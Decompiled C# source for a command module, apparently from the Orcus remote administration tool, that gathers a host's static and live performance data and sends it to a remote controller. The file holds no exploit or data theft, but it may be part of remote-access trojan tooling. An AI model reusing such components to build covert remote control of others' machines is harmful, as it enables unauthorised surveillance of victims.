using System;
using Orcus.Plugins;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.LivePerformance;

public class LivePerformanceCommand : Command
{
	private LivePerformance _livePerformance;

	public override void Dispose()
	{
		_livePerformance?.Dispose();
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Invalid comparison between Unknown and I4
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		LivePerformanceCommunication val = (LivePerformanceCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 1)
			{
				throw new ArgumentOutOfRangeException();
			}
			if (_livePerformance == null)
			{
				_livePerformance = new LivePerformance();
			}
			LiveData data = _livePerformance.GetData();
			Serializer val2 = new Serializer(typeof(LiveData));
			((Command)this).ResponseBytes((byte)3, val2.Serialize((object)data), connectionInfo);
		}
		else
		{
			StaticPerformanceData staticPerformanceData = StaticPerformance.GetStaticPerformanceData();
			Serializer val2 = new Serializer(typeof(StaticPerformanceData));
			((Command)this).ResponseBytes((byte)2, val2.Serialize((object)staticPerformanceData), connectionInfo);
		}
	}

	protected override uint GetId()
	{
		return 19u;
	}
}
